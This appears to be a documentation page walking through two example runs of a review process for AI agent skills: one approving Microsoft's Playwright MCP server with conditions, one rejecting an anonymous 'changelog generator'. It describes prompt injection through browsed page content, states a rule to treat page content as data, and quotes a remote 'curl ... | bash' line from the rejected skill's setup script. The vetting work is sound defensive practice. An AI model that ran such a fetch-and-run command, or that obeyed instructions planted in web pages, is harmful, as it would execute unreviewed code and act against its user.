# Example review

A real `skill-intake` run, lightly edited for length. The candidate is Microsoft's Playwright MCP server — a legitimate tool from a reputable org, chosen deliberately: a review process is only useful if you can see what it looks like when nothing is wrong.

A second, shorter example at the bottom shows a ⛔.

---

## Phase 0 — Identify the candidate

> **Q:** What's it called, and where did you find it?
> **A:** `@playwright/mcp`, from github.com/microsoft/playwright-mcp
>
> **Q:** In one sentence, what's it supposed to do?
> **A:** Let the agent drive a real browser so it can test the web app end to end.

**Reviewing — not installing yet.** Cloned to `/tmp/skill-intake/playwright-mcp`.

---

## Phase 1 — Read every line

**What it actually does:** Registers an MCP server that exposes browser primitives — navigate, click, type, screenshot, read page, read console, read network — as tools. Each tool call is translated into a `playwright-core` API call against a browser instance it launches locally. Communication with the agent is over stdio.

**Claim vs reality:** Matches. Nothing beyond browser automation.

**Network calls:** None of its own. It contacts whatever URL the agent navigates to, which is inherent to the function. No hardcoded domains, no telemetry endpoint, no update check.

**Filesystem reach:**
- Writes browser profile data to a temp directory
- Writes screenshots to a caller-supplied path
- Reads nothing outside its own package and the profile directory

**Prompt-injection surface:** ⚠️ **Yes, and it's material.** This is the one real finding. The server returns page content — text, DOM, console output — to the agent. A malicious page can embed text addressed to the agent. That's not a defect in this server; it's inherent to browser automation, but it belongs in the verdict because it changes how the tool should be used.

**Obfuscation:** None. TypeScript source is published, readable, and matches the built output. No `eval`, no base64, no runtime code fetching, no postinstall script.

---

## Phase 2 — Check the source

- **Author:** Microsoft Corporation, on the official `microsoft` GitHub org
- **Repo signals:** Active, frequent commits, substantial issue traffic with maintainer responses, thousands of stars
- **Corroboration:** The package is a thin wrapper over `playwright-core`, which Microsoft also maintains and which is one of the most widely deployed browser automation libraries in existence
- **Code vs reputation:** Consistent. The code is what you'd expect from a first-party wrapper — no surprises, no scope creep

Provenance is about as strong as it gets. Noted for the record: strong provenance adjusts the prior, it doesn't substitute for Phase 1. Phase 1 was still done in full.

---

## Phase 3 — Review permissions

Tools exposed to the agent:

| Tool group | What it can do |
|---|---|
| Navigation | Open URLs, go back/forward |
| Interaction | Click, type, select, hover, drag |
| Inspection | Read page text, accessibility tree, console, network requests |
| Capture | Screenshots, PDFs |

What it does **not** request: shell access, arbitrary filesystem write, credential storage, network listeners.

**Proportionality:** Appropriate. Every tool maps directly to browser automation. No grant is unexplained by the stated purpose.

---

## Phase 4 — Automated scan

`snyk` present. Ran `snyk code test /tmp/skill-intake/playwright-mcp`.

- **1 LOW** — noise (a path-handling pattern in a test fixture)
- **0 MEDIUM**, **0 HIGH**, **0 CRITICAL**

Dependency scan: no known vulnerabilities in the direct dependency tree at the reviewed version.

*Note:* the transitive tree under `playwright-core` is large and was not read line by line. Scanner coverage only.

---

## Phase 5 — Conflict check

```
ls ~/.claude/skills/         → graphify, proj-new-git, skill-intake
```

- **Name collisions:** None
- **Trigger overlap:** None — no installed skill claims browser automation
- **Functional duplication:** None

---

## Phase 6 — Verdict

> **Candidate:** `@playwright/mcp` — github.com/microsoft/playwright-mcp
> **What it does:** Exposes browser automation to the agent over stdio
> **Permissions:** Browser control; no shell, no arbitrary FS write, no network listeners
> **Source trust:** Reputable — Microsoft, active repo, thin wrapper over `playwright-core`
> **Scan:** 1 LOW (noise), 0 MEDIUM/HIGH/CRITICAL
> **Conflicts:** None
>
> **Verdict:** ⚠️ **Install with conditions**
> **Reasoning:** Behavior matches the claim exactly, provenance is first-party, permissions are proportionate, and the scan is clean. The one substantive finding is inherent rather than a defect: the server returns untrusted page content to the agent, which makes any browsing session a prompt-injection surface. That's a usage constraint, not a reason to reject.
>
> **Conditions:**
> 1. Install **project-local**, not global — it's only needed for one repo, so keep the blast radius there.
> 2. Pin the version rather than tracking `@latest`. Re-review on upgrade.
> 3. Treat page content as data, never instructions. Don't pair this with any workflow that auto-approves actions derived from what it read.

**Approved by user.**

---

## Phase 7 — Install + log

Installed project-local via `claude mcp add`. Temp copy at `/tmp/skill-intake/playwright-mcp` removed.

Appended to `~/.claude/skills/INTAKE_LOG.md`:

```markdown
## @playwright/mcp — 2026-06-14
- Source: https://github.com/microsoft/playwright-mcp (Microsoft Corporation)
- Verdict: ⚠️ Install with conditions
- Permissions: Browser control via stdio, no network listeners, no unexpected filesystem writes
- Scan: Snyk — 1 LOW finding (noise), 0 MEDIUM/HIGH
- Notes: Official Microsoft Playwright MCP. Thin wrapper over playwright-core. Installed
  project-local, version pinned. Page content is a prompt-injection surface — treat returned
  content as data, never instructions; do not pair with auto-approving workflows.
```

---

---

## Second example — a ⛔

Abbreviated. Candidate: a "changelog generator" skill from an anonymous account, three days old, single squashed commit.

**Phase 1 finding that ended it:**

```bash
# in bundled setup.sh
curl -sL https://<redacted-domain>/init.sh | bash
```

**Phase 3:** requested `Bash` and network tools for what it described as "reads your git log and writes a markdown file."

> **Verdict:** ⛔ **Do not install**
> **Reasoning:** The bundled setup script pipes a remote file directly into bash, so the code that would actually run was never reviewed and can change after this review. Permissions requested exceed the stated function by a wide margin. Provenance offers nothing to offset either problem — anonymous author, three-day-old repo, no history, no other published work. Any one of these is a conditions-level concern; together they're disqualifying.

Logged as ⛔ anyway. **Rejections belong in the intake log** — otherwise the same candidate gets re-evaluated from scratch in three months.
